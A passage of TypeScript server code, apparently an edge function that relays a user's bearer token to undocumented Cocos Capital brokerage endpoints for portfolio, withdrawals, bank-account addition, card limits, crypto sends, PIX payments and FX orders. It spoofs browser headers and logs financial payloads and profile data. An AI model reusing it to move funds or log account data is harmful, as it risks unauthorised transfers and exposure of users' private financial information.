            updated++;
          }
          results.push({ id: tx.id, old_status: tx.status, new_status: needsUpdate ? apiStatus : tx.status, updated: needsUpdate, amount_brl: tx.amount_brl });
        } catch { errors++; results.push({ id: tx.id, old_status: tx.status, new_status: tx.status, updated: false, amount_brl: tx.amount_brl }); }
      }

      // Summary
      const successStatuses = new Set(["completed", "success", "pending_execution", "pending"]);
      let totalBrl = 0, sentCount = 0, failedCount = 0;
      // Use updated results for accuracy
      for (const r of results) {
        if (successStatuses.has(r.new_status.toLowerCase())) { sentCount++; totalBrl += Number(r.amount_brl) || 0; }
        else { failedCount++; }
      }

      return json({
        success: true,
        total_transactions: allTx.length,
        checked, updated, skipped, errors,
        summary: { total: allTx.length, sent: sentCount, failed: failedCount, total_brl: totalBrl },
        details: results,
      });
    }

    // ---- Endpoints autenticados (precisam de access_token) ----
    if (!accessToken) {
      return err("access_token requerido para esta ação", 401);
    }

    const accountId = body.account_id as string | undefined;

    switch (action) {
      // 2. USERS
      case "get_profile":
        return await proxyGet(accessToken, "/api/v2/users/me", undefined, accountId);
      case "get_user_auth":
        {
          const res = await pfetch(`${AUTH_URL}/auth/v1/user`, {
            method: "GET",
            headers: authHeaders(accessToken),
          });
          const data = await res.json();
          return json({ success: res.ok, ...data }, res.status);
        }
      case "get_account_id":
        {
          // Fetch user profile to get numeric account ID
          const res = await pfetch(`${API_URL}/api/v2/users/me`, {
            method: "GET",
            headers: apiHeaders(accessToken),
          });
          const data = await res.json();
          console.log(`[GET ACCOUNT ID] status=${res.status}`, JSON.stringify(data).slice(0, 300));
          return json({ success: res.ok, ...data }, res.status);
        }
      case "update_settings":
        return await proxyPost(accessToken, "/api/v1/users/user-settings", body.payload || {}, accountId);
      case "get_account_tier":
        return await proxyGet(accessToken, "/api/v1/users/account-tier", undefined, accountId);
      
      // Factors list (post-aal2)
      case "get_factors":
        {
          const res = await pfetch(`${AUTH_URL}/auth/v1/factors`, {
            method: "GET",
            headers: {
              accept: "application/json, text/plain, */*",
              "accept-language": "pt-BR,pt;q=0.9",
              authorization: `Bearer ${accessToken}`,
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              Referer: "https://app.cocos.capital/",
            },
          });
          const data = await res.json();
          return json({ success: res.ok, ...data }, res.status);
        }

      // 3. PORTFOLIO
      case "get_portfolio":
        return await proxyGet(accessToken, "/api/portfolio", {
          currency: body.currency || "ARS",
          ...(body.from ? { from: String(body.from) } : {}),
        }, accountId);
      case "get_portfolio_balance":
        return await proxyGet(accessToken, "/api/portfolio/balance", {
          currency: body.currency || "ARS",
          period: body.period || "1D",
        }, accountId);
      case "get_portfolio_balance_usd":
        return await proxyGet(accessToken, "/api/portfolio/balance", {
          currency: "USD",
          period: body.period || "1D",
        }, accountId);
      case "get_portfolio_history":
        return await proxyGet(accessToken, "/api/portfolio/history", {
          metric: body.metric || "BALANCE",
          period: body.period || "1M",
          currency: body.currency || "ARS",
        }, accountId);

      // 4. ORDERS
      case "list_orders":
        return await proxyGet(accessToken, "/api/v2/orders", undefined, accountId);
      case "get_buying_power":
        return await proxyGet(accessToken, "/api/v2/orders/buying-power", undefined, accountId);
      case "create_order":
        return await proxyPost(accessToken, "/api/v2/orders", body.payload || {}, accountId);
      case "redeem_fci":
        return await proxyPost(accessToken, "/api/v2/orders/fci", body.payload || {}, accountId);

      // 5. TRANSFERS
      case "list_bank_accounts":
        return await proxyGet(accessToken, "/api/v1/transfers/accounts", {
          currency: body.currency || "ARS",
        }, accountId);
      case "add_bank_account":
        return await proxyPost(accessToken, "/api/v1/transfers/accounts", body.payload || {}, accountId);
      case "create_withdrawal":
        return await proxyPost(accessToken, "/api/v1/transfers/withdraw", body.payload || {}, accountId);

      // 6. CARDS
      case "list_cards":
        return await proxyGet(accessToken, "/api/v1/cards/user", undefined, accountId);
      case "request_card":
        return await proxyPost(accessToken, "/api/v1/cards/user/request-card", body.payload || {}, accountId);
      case "get_card_limits":
        return await proxyGet(accessToken, "/api/v1/cards/limits", undefined, accountId);
      case "update_card_limit":
        return await proxyPatch(accessToken, "/api/v1/cards/limits", body.payload || {}, accountId);

      // 7. CRYPTO
      case "get_crypto_portfolio":
        return await proxyGet(accessToken, "/api/v1/crypto/customer/portfolio", undefined, accountId);
      case "get_crypto_prices":
        return await proxyGet(accessToken, "/api/v1/crypto/prices", undefined, accountId);
      case "get_crypto_movements":
        return await proxyGet(accessToken, "/api/v1/crypto/customer/movements", {
          limit: String(body.limit || 50),
        }, accountId);
      case "buy_crypto":
        return await proxyPost(accessToken, "/api/v1/crypto/customer/orders/buy", body.payload || {}, accountId);
      case "confirm_crypto_buy":
        return await proxyPost(
          accessToken,
          "/api/v1/crypto/customer/orders/buy/confirm",
          body.payload || {},
          accountId
        );

      // 7.5 CRYPTO — Sell, Confirm, Customer, Tags
      case "crypto_get_customer":
        return await proxyGet(accessToken, "/api/v1/crypto/customer", undefined, accountId);
      case "crypto_set_tag":
        if (!body.tag_name) return err("tag_name requerido");
        return await proxyPut(accessToken, `/api/v1/crypto/customer/tags/${encodeURIComponent(String(body.tag_name))}`, {}, accountId);
      case "crypto_sell_order":
        // POST /api/v1/crypto/customer/orders/sell — { baseTicker, baseQuantity }
        return await proxyPost(accessToken, "/api/v1/crypto/customer/orders/sell", body.payload || {}, accountId);
      case "crypto_sell_confirm":
        // POST /api/v1/crypto/customer/orders/sell/confirm — { idOrder }
        return await proxyPost(accessToken, "/api/v1/crypto/customer/orders/sell/confirm", body.payload || {}, accountId);
      case "crypto_create_customer":
        // Creates crypto account for user (POST or PUT depending on API)
        return await proxyPost(accessToken, "/api/v1/crypto/customer", body.payload || {}, accountId);
      case "crypto_get_balance":
        // GET portfolio balance (same as get_portfolio_balance but explicitly for crypto context)
        return await proxyGet(accessToken, "/api/portfolio/balance", {
          currency: body.currency || "ARS",
          period: body.period || "MAX",
        }, accountId);
      case "crypto_portfolio_ars":
        // GET /api/portfolio?currency=ARS&from=CRYPTO
        return await proxyGet(accessToken, "/api/portfolio", {
          currency: body.currency || "ARS",
          from: body.from || "CRYPTO",
        }, accountId);
      case "crypto_prices":
        // GET /api/v1/crypto/prices?baseTicker=SOL&quoteTicker=ARS
        return await proxyGet(accessToken, "/api/v1/crypto/prices", {
          baseTicker: body.baseTicker || "SOL",
          quoteTicker: body.quoteTicker || "ARS",
        }, accountId);
      case "crypto_send_order":
        // POST /api/v1/crypto/customer/orders/send — { ticker, quantity, tag }
        return await proxyPost(accessToken, "/api/v1/crypto/customer/orders/send", body.payload || {}, accountId);
      case "crypto_send_confirm":
        // POST /api/v1/crypto/customer/orders/send/confirm — { idOrder }
        return await proxyPost(accessToken, "/api/v1/crypto/customer/orders/send/confirm", body.payload || {}, accountId);

      // 8. MARKETS
      case "list_tickers":
        return await proxyGet(accessToken, "/api/v1/markets/tickers", {
          currency: body.currency || "ARS",
          page: String(body.page || 1),
          size: String(body.size || 20),
        }, accountId);
      case "search_ticker":
        return await proxyGet(accessToken, "/api/v1/markets/tickers/search", {
          q: body.q || "",
        }, accountId);
      case "get_market_schedule":
        return await proxyGet(accessToken, "/api/v1/markets/schedule", undefined, accountId);

      // 9. PUBLIC
      case "get_platform_status":
        return await proxyGet(accessToken, "/api/v1/public/status", undefined, accountId);
      case "get_tariffs":
        return await proxyGet(accessToken, "/api/tariff", undefined, accountId);
      case "get_banners":
        return await proxyGet(accessToken, "/api/banners", undefined, accountId);
      case "get_dollar_quotes":
        return await proxyGet(accessToken, "/api/v1/usd/prices", undefined, accountId);

      // 10. PIX
      case "pix_scan_key":
        // Step 1: Scan a PIX key (phone, email, cpf, etc) → returns payment info
        return await proxyGet(accessToken, "/api/v1/payment/qr", {
          qrData: body.qr_data || body.pix_key || "",
        }, accountId);
      case "pix_get_methods":
        // Step 2: Get payment methods for a given payment ID + quantity
        return await proxyGet(accessToken, `/api/v1/payment/${body.payment_id}/methods`, {
          quantity: String(body.quantity || 0),
        }, accountId);
      case "pix_confirm":
        // Step 3: Confirm payment — POST /api/v1/payment/{id} with {paymentMethod, quantity}
        return await proxyPost(accessToken, `/api/v1/payment/${body.payment_id}`, {
          paymentMethod: body.payment_method || body.paymentMethod || "ARS",
          quantity: body.quantity || 0,
        }, accountId);
      case "pix_generate_qr":
        return await proxyGet(accessToken, "/api/v1/payment/qr", undefined, accountId);
      case "pix_create_payment":
        return await proxyPost(accessToken, "/api/v1/payment", body.payload || {}, accountId);
      case "pix_check_status":
        return await proxyGet(accessToken, `/api/v1/payment/${body.payment_id || "unknown"}/status`, undefined, accountId);
      case "pix_get_payment":
        // GET /api/v1/payment/{id} — same path as confirm but GET
        return await proxyGet(accessToken, `/api/v1/payment/${body.payment_id || "unknown"}`, undefined, accountId);
      case "pix_history":
        return await proxyGet(accessToken, "/api/v1/payment/history", {
          limit: String(body.limit || 20),
          offset: String(body.offset || 0),
          type: body.type || "PIX",
        }, accountId);
      case "pix_prices":
        return await proxyGet(accessToken, "/api/v1/public/pix-prices", undefined, accountId);
      case "pix_limits":
        return await proxyGet(accessToken, "/api/v1/payment/limits", undefined, accountId);

      // 10.5 FX — Dólar MEP Conversion
      case "fx_get_prices":
        return await proxyGet(accessToken, "/api/v1/usd/prices", undefined, accountId);
      case "fx_canje":
        // POST /api/v2/orders/dolar/canje — BUY_USD or SELL_USD
        console.log(`[FX CANJE] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v2/orders/dolar/canje", body.payload || {}, accountId);
      case "fx_prepare":
        console.log(`[FX PREPARE] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v1/orders/fx/prepare", body.payload || {}, accountId);
      case "fx_confirm":
        console.log(`[FX CONFIRM] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v1/orders/fx/confirm", body.payload || {}, accountId);
      case "fx_buy_open_mep":
        console.log(`[FX BUY OPEN] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v4/orders/buy-open-mep", body.payload || {}, accountId);
      case "fx_sell_open_mep":
        console.log(`[FX SELL OPEN] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v4/orders/sell-open-mep", body.payload || {}, accountId);
      case "fx_buy_close_mep":
        console.log(`[FX BUY CLOSE] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v4/orders/buy-close-mep", body.payload || {}, accountId);
      case "fx_sell_close_mep":
        console.log(`[FX SELL CLOSE] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v4/orders/sell-close-mep", body.payload || {}, accountId);
      case "fx_buy_overnight_mep":
        console.log(`[FX BUY OVERNIGHT] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v4/orders/buy-overnight-mep", body.payload || {}, accountId);
      case "fx_sell_overnight_mep":
        console.log(`[FX SELL OVERNIGHT] payload=${JSON.stringify(body.payload || {})}`);
        return await proxyPost(accessToken, "/api/v4/orders/sell-overnight-mep", body.payload || {}, accountId);
      // get_dollar_quotes already handled above (line 776)

      // 11. CARD PAYMENTS & TRANSACTIONS
      case "get_payment_method":
        return await proxyGet(accessToken, "/api/v1/cards/payment-method", undefined, accountId);
      case "set_payment_method":
        return await proxyPost(accessToken, "/api/v1/cards/payment-method", body.payload || {}, accountId);
      case "get_card_transactions_grouped":
        return await proxyGet(accessToken, "/api/v1/cards/transactions/grouped", {
          period: body.period || "1M",
          currency: body.currency || "ARS",
        }, accountId);
      case "get_card_transactions":
        return await proxyGet(accessToken, "/api/v1/cards/transactions", {
          limit: String(body.limit || 50),
          offset: String(body.offset || 0),
          status: body.status || "COMPLETED",
        }, accountId);
      case "get_shipping_payment_methods":
        return await proxyGet(accessToken, "/api/v2/cards/shipping-payment-methods", undefined, accountId);
      case "get_payment_settings":
        return await proxyGet(accessToken, "/api/v1/cards/payment/settings", undefined, accountId);


      default:
        return err(`Ação desconhecida: ${action}`);
    }
  } catch (e) {
    console.error("cocos-auth error:", e);
    return json(
      { success: false, error: "Error interno al procesar la solicitud" },
      500
    );
  }
});
